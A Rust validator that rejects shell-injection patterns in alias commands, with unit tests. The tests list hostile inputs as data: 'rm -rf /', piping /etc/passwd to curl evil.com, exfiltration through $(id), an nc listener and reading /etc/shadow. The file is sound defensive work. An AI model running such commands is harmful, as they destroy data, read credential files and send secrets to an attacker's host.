use anyhow::{anyhow, Result};

/// List of dangerous shell metacharacters that should be rejected
const DANGEROUS_SHELL_CHARS: &[char] = &[
    ';',  // Command separator
    '|',  // Pipe
    '&',  // Background/AND
    '$',  // Variable expansion
    '`',  // Command substitution (backticks)
    '(',  // Subshell start
    ')',  // Subshell end
    '<',  // Input redirection
    '>',  // Output redirection
    '\n', // Newline (command separator)
    '\r', // Carriage return
];

/// Validates an alias command for security vulnerabilities
///
/// This function checks for common shell injection attack vectors including:
/// - Command separators (;, |, &)
/// - Command substitution ($(), `)
/// - Redirection operators (<, >)
/// - Subshells ((), {})
/// - Newlines and other control characters
///
/// # Arguments
/// * `command` - The command string to validate
///
/// # Returns
/// * `Ok(())` - If the command is safe
/// * `Err` - If the command contains dangerous patterns
///
/// # Examples
/// ```
/// # use msc::core::alias_validator::validate_alias_command;
/// // Safe command
/// assert!(validate_alias_command("ls -la").is_ok());
///
/// // Dangerous command with semicolon
/// assert!(validate_alias_command("ls; rm -rf /").is_err());
/// ```
pub fn validate_alias_command(command: &str) -> Result<()> {
    // 1. Check for empty command
    if command.trim().is_empty() {
        return Err(anyhow!("Command cannot be empty"));
    }

    // 2. Check length
    if command.len() > 1000 {
        return Err(anyhow!("Command too long (max 1000 chars)"));
    }

    // 3. Check for null bytes
    if command.contains('\0') {
        return Err(anyhow!("Command contains null byte"));
    }

    // 4. Check for dangerous characters
    for &ch in DANGEROUS_SHELL_CHARS {
        if command.contains(ch) {
            return Err(anyhow!(
                "Command contains dangerous character '{}' - potential shell injection",
                ch.escape_default()
            ));
        }
    }

    // 5. Check for command substitution patterns
    if command.contains("$(") {
        return Err(anyhow!(
            "Command substitution $() not allowed - potential shell injection"
        ));
    }

    // 6. Check for brace expansion (can be dangerous)
    if command.contains('{') || command.contains('}') {
        return Err(anyhow!(
            "Brace expansion not allowed - potential shell injection"
        ));
    }

    // 7. Check for path traversal
    if command.contains("..") {
        return Err(anyhow!("Path traversal (..) not allowed in commands"));
    }

    // 8. Check for escaped characters that might bypass validation
    if command.contains('\\') {
        return Err(anyhow!(
            "Escape sequences (\\) not allowed - potential validation bypass"
        ));
    }

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_validate_safe_commands() {
        let safe_commands = vec![
            "ls -la",
            "git status",
            "python3 -m http.server 8000",
            "npm run dev",
            "cargo build --release",
            "docker ps -a",
            "kubectl get pods",
            "echo hello",
            "cat file.txt",
        ];

        for cmd in safe_commands {
            assert!(
                validate_alias_command(cmd).is_ok(),
                "Should allow safe command: {}",
                cmd
            );
        }
    }

    #[test]
    fn test_reject_command_separator() {
        let dangerous = vec!["ls; rm -rf /", "echo hello; curl evil.com", "id; whoami"];

        for cmd in dangerous {
            assert!(
                validate_alias_command(cmd).is_err(),
                "Should reject command with semicolon: {}",
                cmd
            );
        }
    }

    #[test]
    fn test_reject_pipe() {
        let dangerous = vec!["cat /etc/passwd | curl evil.com", "ls | grep secret"];

        for cmd in dangerous {
            assert!(
                validate_alias_command(cmd).is_err(),
                "Should reject command with pipe: {}",
                cmd
            );
        }
    }

    #[test]
    fn test_reject_background_operator() {
        let dangerous = vec!["ls & malware &", "echo test & nc -l 1234 &"];

        for cmd in dangerous {
            assert!(
                validate_alias_command(cmd).is_err(),
                "Should reject command with background operator: {}",
                cmd
            );
        }
    }

    #[test]
    fn test_reject_command_substitution() {
        let dangerous = vec![
            "echo $(whoami)",
            "curl evil.com?user=$(id)",
            "echo `hostname`",
        ];

        for cmd in dangerous {
            assert!(
                validate_alias_command(cmd).is_err(),
                "Should reject command substitution: {}",
                cmd
            );
        }
    }

    #[test]
    fn test_reject_redirection() {
        let dangerous = vec![
            "cat secret > /tmp/stolen",
            "echo malicious >> /etc/hosts",
            "cat < /etc/shadow",
        ];

        for cmd in dangerous {
            assert!(
                validate_alias_command(cmd).is_err(),
                "Should reject redirection: {}",
                cmd
            );
        }
    }

    #[test]
    fn test_reject_subshell() {
        let dangerous = vec!["(cd /tmp && malware)", "echo (test)"];

        for cmd in dangerous {
            assert!(
                validate_alias_command(cmd).is_err(),
                "Should reject subshell: {}",
                cmd
            );
        }
    }

    #[test]
    fn test_reject_empty_command() {
        assert!(validate_alias_command("").is_err());
        assert!(validate_alias_command("   ").is_err());
    }

    #[test]
    fn test_reject_too_long() {
        let long_cmd = "a".repeat(1001);
        assert!(validate_alias_command(&long_cmd).is_err());
    }
}
